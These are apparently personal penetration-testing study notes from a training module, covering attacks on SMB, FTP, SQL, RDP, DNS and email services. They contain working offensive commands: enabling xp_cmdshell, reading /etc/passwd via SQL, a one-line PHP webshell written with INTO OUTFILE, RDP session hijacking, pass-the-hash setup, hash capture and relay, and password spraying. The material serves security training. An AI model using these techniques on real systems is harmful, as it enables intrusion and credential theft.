---
layout: single
title:  "HTB Academy - Attacking Common Services"
categories: 
  - OSCP Notes
tags:
  - htb-academy
toc: true
toc_label: "Contents"
toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
excerpt: ""
permalink: /posts/attacking-common-services-notes
author_profile: false
sidebar:
  nav: "navbar"
---

## Connecting to Services

### Connecting to SMB on Windows

* Through `Win + R`: Type in the name of the SMB share and press `Enter`.
* Through `cmd`: Use the `dir` command to view the SMB share, and connect to the share using `net use n: <share name>`. We can also pass in credentials using the `/user:` option.
  * To enumerate the number of files on the SMB share: `dir n: /a-d /s /b | find /c ":\"`.
  * To filter out files by string content, we can use `findstr`, which is similar to `grep`.
* Through `PowerShell`: Instead of `net use`, we can use the `New-PSDrive` cmdlet instead: `New-PSDrive -Name "N" -Root "<share name>" -PSProvider "FileSystem"`.
  * To pass in credentials, we create a `PSCredential` object.
  * To list files, `Get-ChildItem` or `gci` is an alternative to `dir`. To get file count, we can simply use `(Get-ChildItem -File -Recurse | Measure-Object).Count`.
  * The `-Include` option in `gci` allows us to find specific items by name.
  * `Select-String` is an alternative to `findstr`.

### Connecting to SMB on Linux

* Make a new mount directory using `sudo mkdir /mnt/<dir name>`, then mount the SMB share using `sudo mount -t cifs -o username=...,password=...,domain=. <sharename> /mnt/<dir name>`.
  * Alternatively, use a credential file.
  * Note that we need `cifs-utils` to connect to an SMB share folder.
  * After mounting the SMB share, we can use `find` and `grep` as necessary.

### Connecting to Email on Linux

* We can use a mail client such as `Evolution`.

### Connecting to Databases

* We can use command line utilities, GUI applications like DBeaver, or through programming languages.
* For MSSQL through Linux, we can use `sqsh`. Through Windows, we use `sqlcmd`.
* For MySQL through Linux, use `mysql`. Through Windows, we can use `mysql.exe`.

### Tools to Interact with Common Services

| **SMB**                                                                                  | **FTP**                                     | **Email**                                          | **Databases**                                                                                                                |
| ---------------------------------------------------------------------------------------- | ------------------------------------------- | -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)          | [ftp](https://linux.die.net/man/1/ftp)      | [Thunderbird](https://www.thunderbird.net/en-US/)  | [mssql-cli](https://github.com/dbcli/mssql-cli)                                                                              |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)                              | [lftp](https://lftp.yar.ru/)                | [Claws](https://www.claws-mail.org/)               | [mycli](https://github.com/dbcli/mycli)                                                                                      |
| [SMBMap](https://github.com/ShawnDEvans/smbmap)                                          | [ncftp](https://www.ncftp.com/)             | [Geary](https://wiki.gnome.org/Apps/Geary)         | [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                             |
| [Impacket](https://github.com/SecureAuthCorp/impacket)                                   | [filezilla](https://filezilla-project.org/) | [MailSpring](https://getmailspring.com)            | [dbeaver](https://github.com/dbeaver/dbeaver)                                                                                |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)   | [crossftp](http://www.crossftp.com/)        | [mutt](http://www.mutt.org/)                       | [MySQL Workbench](https://dev.mysql.com/downloads/workbench/)                                                                |
| [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) |                                             | [mailutils](https://mailutils.org/)                | [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) |
|                                                                                          |                                             | [sendEmail](https://github.com/mogaal/sendemail)   |                                                                                                                              |
|                                                                                          |                                             | [swaks](http://www.jetmore.org/john/code/swaks/)   |                                                                                                                              |
|                                                                                          |                                             | [sendmail](https://en.wikipedia.org/wiki/Sendmail) |                                                                                                                              |

## Attacking FTP

`nmap -sC` runs the `ftp-anon` script which checks if anonymous login is allowed.

To brute-force possible logins, we can use `medusa` or `crackmapexec` or `hydra`.

FTP Bounce Attack - Using FTP servers as a proxy to attack internal servers, where commands are executed through the FTP server.

* The `-b` option in `nmap` allows us to perform FTP bounce attacks:  `nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2`.

## Attacking SMB

`smbmap` is a useful tool for enumeration, as it shows us a list of permissions that we have for the respective shares/folders: `smbmap -H`.

* Using the `-r` option, we can recursively browse the directories.

`rpcclient` cheat sheet: <https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf>

We can also use `enum4linux` to enumerate SMB targets, and obtain information like domain/workgroup name, user information, OS information, groups information, shares and password policy information.

For `crackmapexec`, we can use the `--continue-on-success` option to continue our password spraying attempt. The `--local-auth` option is also required when we are targeting a non-domain joined computer.

RCE on SMB - Through `PsExec`, or Linux implementations like `Impacket PsExec` or `Impacket SMBExec`.

* We can also use `crackmapexec` for this, where we can authenticate and run commands using the `-x` option and `--exec-method`. By default, the `exec-method` will be `atexec`, but we can use `smbexec` as well.

If we want to capture NTLM hashes, we can set up a fake SMB server using `responder`.

### SMB Name Resolution

When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:

* The hostname file share's IP address is required.
* The local host file (`C:\Windows\System32\Drivers\etc\hosts`) will be checked for suitable records.
* If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
* Is there no local DNS record? A query will be sent to the DNS server that has been configured.
* If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

The multicast query can be abused, where we can spoof a response to this query from our spoofed server. This allows us to capture credentials.

* Can happen in cases where a user might mistype the name of the share folder (e.g., typing `sharefoder` instead of `sharefolder`).

When this happens, the end user will try to authenticate to our spoofed server instead of the legitimate server.

We can also relay our captured hashes from `responder` to another machine using `ntlmrelayx`. With this, we can utilize the captured hash in a PtH attack, and potentially dump more hashes from the SAM database, or even execute commands.

* Command execution using the captured hash can allow us to spawn a reverse shell.

## Attacking SQL

MSSQL in "hidden" mode runs on port 2433.

MSSQL authentication modes - Windows authentication (integrated security using Windows credentials), or Mixed mode (using SQL server credentials or Windows/AD credentials).

`MySQL` default system schemas/databases:

* `mysql` - is the system database that contains tables that store information required by the MySQL server.
* `information_schema` - provides access to database metadata.
* `performance_schema` - is a feature for monitoring MySQL Server execution at a low level.
* `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema.

`MSSQL` default system schemas/databases:

* `master` - keeps the information for an instance of SQL Server.
* `msdb` - used by SQL Server Agent.
* `model` - a template database copied for each new database.
* `resource` - a read-only database that keeps system objects visible in every database on the server in `sys` schema.
* `tempdb` - keeps temporary objects for SQL queries.

MSSQL Command Execution - Using `xp_cmdshell`.

* Note that this feature is disabled by default. This can be enabled from service policies or by executing `sp_configure`.
* Windows processes spawned by `xp_cmdshell` have the same rights as the SQL server service account.
* To execute commands using SQL syntax:

  ```
  1> xp_cmdshell 'whoami'
  2> GO
  ```

* To enable `xp_cmdshell` (if we have appropriate privileges):

  ```
  -- To allow advanced options to be changed.  
  EXECUTE sp_configure 'show advanced options', 1
  GO

  -- To update the currently configured value for advanced options.  
  RECONFIGURE
  GO  

  -- To enable the feature.  
  EXECUTE sp_configure 'xp_cmdshell', 1
  GO  

  -- To update the currently configured value for this feature.  
  RECONFIGURE
  GO
  ```

MySQL `SELECT INTO OUTFILE` - allows us to achieve command execution by writing to a location where commands can be executed.

* `FILE` privilege is required here.
* `secure_file_priv` may be set as follows:
  * If empty, the variable has no effect, which is not a secure setting.
  * If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
  * If set to NULL, the server disables import and export operations.
* To write files, enable Ole Automation Procedures:

  ```
  1> sp_configure 'show advanced options', 1
  2> GO
  3> RECONFIGURE
  4> GO
  5> sp_configure 'Ole Automation Procedures', 1
  6> GO
  7> RECONFIGURE
  8> GO
  ```

We can also read system files, provided that appropriate access is granted.

* MSSQL:

  ```
  1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
  2> GO
  ```

* MySQL: `select LOAD_FILE("/etc/passwd");`

Like SMB, we can capture MSSQL service account hashes using `responder`. This can be achieved by trying to connect to a spoofed share using `xp_subdirs` or `xp_dirtree`.

We can also impersonate users using MSSQL:

```
----- Identify users that can be impersonated -----
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------

sa
ben
valentin

----- Verify current user and role -----
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio

(1 rows affected)

-----------
          0 <-- indicates we are not sysadmin, but we can impersonate sa

----- Impersonate the SA user -----
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1
```

Preferably impersonate users within the master DB, as all users have access to that DB by default.

* To return to previous user, use the `REVERT` statement.

We can also enumerate users to determine their access to databases or linked servers.

In a linked server/remote server scenario, we can also execute commands on the other connected servers through MSSQL.

From Lab - webshell upload SQL injection:
`SELECT "<?php system($_REQUEST['cmd']); ?>",'N' INTO OUTFILE '<path to your server site>/webshell.php'`

* To use this, navigate to shell path in website, then pass commands into the URL as queries. E.g., `<domain name>/webshell.php?cmd=<command to exec>`.
* In this case, we could upload a reverse shell and connect from our attack host.
* Note that the one-liner provided in the cheatsheet works similarly. Simply pass in the command as a query to `c`. For example, `<domain>/webshell.php?c=whoami`.

## Attacking RDP

Password spraying attacks can be carried out using the `crowbar` or `hydra` tools.

RDP session hijacking can occur through user impersonation.

* Firstly, we can view active users/sessions using the `query user` command in PowerShell.
* To do this, we will need `SYSTEM` privileges.
* We use the `tscon.exe` binary, where can specify the session ID we would like to assume.

If we have local administrator privileges, we can utilize several methods to obtain `SYSTEM` privileges.

* This can be done through `mimikatz` or `PsExec`.
* Simple trick is to create a service that runs as `Local System` and executes binaries with `SYSTEM` privileges. This can be done using `sc.exe` (a LOLBin): `sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"`.
* Once done, we can start the `sessionhijack` service using `net start sessionhijack`, and assume another session (Note that this does not work on Server 2019).

Recall that we can PtH using RDP, just enable the Restricted Admin Mode by adding the registry key `DisableRestrictedAdmin`.
`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

## Attacking DNS

DNS zone transfers can be queried using `dig axfr`, or using `fierce`.

Domain takeover - registering a non-existent domain name to gain control over another domain

* Sub-domains can also be taken over. For instance, suppose that `sub.target.com` points to `anotherdomain.com` (as per the DNS records), and both are owned by a legitimate entity. Now, if `anotherdomain.com` expires and a malicious actor purchases this domain to host their content, then the subdomain is also taken over, as it continues to point to the expired domain. This persists until the DNS records are updated.

We can enumerate subdomains using a tool like `subfinder` or `subbrute`.

* `subbrute` is useful as it allows us to use self-defined resolvers, and can be useful during internal penetration tests on hosts without internet access.
* To use `subbrute`: `echo <nameserver> > ./resolvers.txt`, then
  `./subbrute <domain> -s ./names.txt -r ./resolvers.txt`.

DNS Cache Poisoning/Spoofing

* For local cache poisoning, MITM tools like `ettercap` or `bettercap` can be used.

## Attacking Email

The presence of a mail exchanger server can be determined through a DNS lookup.

SMTP misconfiguration - enabled `VRFY`, `EXPN` and `RCPT TO` commands.

* `VRFY` will instruct the SMTP server to check the validity of a username, thus allowing us to enumerate users.
* `EXPN` is similar, but it can also list all users of an email distribution list, if a DL is provided.
* `RCPT` will identify recipients of an email message.

Users can also be enumerated on POP3 using the `USER` command. If a valid user is presented, the server responds with `OK`.

SMTP enumeration can be performed using `smtp-user-enum`.

For cloud email providers, there are tools for enumeration.

* For Office 365, we can use `O365spray` for username enumeration and password spraying.
  * Validate that the target domain is on Office 365: `python3 o365spray.py --validate --domain msplaintext.xyz`.
  * Then, enumerate usernames using the `--enum` option.
  * Spray passwords with the `--spray` option.
* Alternative tools: `MailSniper`, `CredKing`.

SMTP Open Relay - Disguising emails as legitimate by forwarding them through an SMTP server, which may be an open relay.

* For example, emails can be spoofed and sent to users through a legitimate SMTP server which is an open relay.
